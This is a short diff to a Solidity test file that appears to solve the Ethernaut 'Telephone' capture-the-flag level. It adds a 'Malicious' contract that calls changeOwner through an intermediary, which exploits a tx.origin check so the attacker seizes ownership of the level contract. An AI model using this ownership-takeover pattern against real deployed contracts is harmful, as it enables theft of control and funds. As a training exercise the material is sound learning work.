@@ -39,7 +39,22 @@ contract TestTelephone is BaseTest {
         vm.startPrank(player, player);
 
         // Solve the Challenge
+        Malicious malicious = new Malicious(levelAddress);
+        malicious.attack();
 
         vm.stopPrank();
     }
+}
+
+contract Malicious {
+
+  Telephone immutable i_telephone;
+
+  constructor(address telephone) public {
+    i_telephone = Telephone(telephone);
+  }
+
+  function attack() external {
+    i_telephone.changeOwner(msg.sender);
+  }
 }
